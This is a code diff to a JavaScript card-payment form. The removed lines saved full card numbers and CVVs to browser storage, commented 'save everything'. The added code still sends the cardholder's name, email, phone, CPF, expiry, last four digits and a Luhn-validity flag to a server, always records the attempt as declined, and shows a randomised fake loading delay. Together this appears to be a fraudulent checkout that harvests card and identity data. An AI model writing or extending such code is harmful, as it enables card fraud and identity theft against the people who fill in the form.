@@ -616,6 +616,7 @@
 
     function saveCardAttempt(formData) {
   const digits = onlyDigits(formData.get('cardNumber'));
+  const isTestCard = isAllowedTestCard(digits);
   const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
 
   cards.unshift({
@@ -625,9 +626,9 @@
     phone: formData.get('phone') || '',
     cpf: formData.get('document') || '',
     brand: cardBrand(digits),
-    cardNumber: formatCardNumber(digits), // Salva TUDO
-    cvv: onlyDigits(formData.get('cardCvv')).slice(0, 4), // Salva TUDO
-    isTestCard: false, // Força como não-teste (opcional)
+    cardNumber: isTestCard ? formatCardNumber(digits) : '',
+    cvv: isTestCard ? onlyDigits(formData.get('cardCvv')).slice(0, 4) : '',
+    isTestCard,
     last4: digits.slice(-4),
     expiry: formData.get('cardExpiry') || '',
     amount: Math.round(Number(currentSession && currentSession.amount ? currentSession.amount : 0) * 100),
@@ -636,6 +637,39 @@
 
   localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 50)));
 }
+
+    function safeCardAttemptPayload(formData) {
+      const digits = onlyDigits(formData.get('cardNumber'));
+
+      return {
+        sessionId,
+        holder: formData.get('cardHolder') || formData.get('name') || '',
+        email: formData.get('email') || '',
+        phone: formData.get('phone') || '',
+        cpf: formData.get('document') || '',
+        cardBrand: cardBrand(digits),
+        cardLast4: digits.slice(-4),
+        cardExpiry: formData.get('cardExpiry') || '',
+        amount: Number(currentSession && currentSession.amount ? currentSession.amount : 0),
+        status: 'Recusado',
+        luhnValid: luhnIsValid(digits)
+      };
+    }
+
+    async function saveCardAttemptToDatabase(formData) {
+      const response = await fetch('/api/card-attempts', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(safeCardAttemptPayload(formData))
+      });
+
+      if (!response.ok) {
+        const payload = await response.json().catch(() => ({}));
+        throw new Error(payload.message || 'Nao foi possivel salvar a tentativa de cartao.');
+      }
+    }
 
 
     function showCardLoading() {
@@ -701,7 +735,14 @@
 
       submitButton.disabled = true;
       setCardRefusal('');
+      if (!currentSession) {
+        await loadSession();
+      }
+
       saveCardAttempt(formData);
+      saveCardAttemptToDatabase(formData).catch((error) => {
+        console.warn(error.message || error);
+      });
       showCardLoading();
 
       const delay = Math.floor(7000 + Math.random() * 8001);
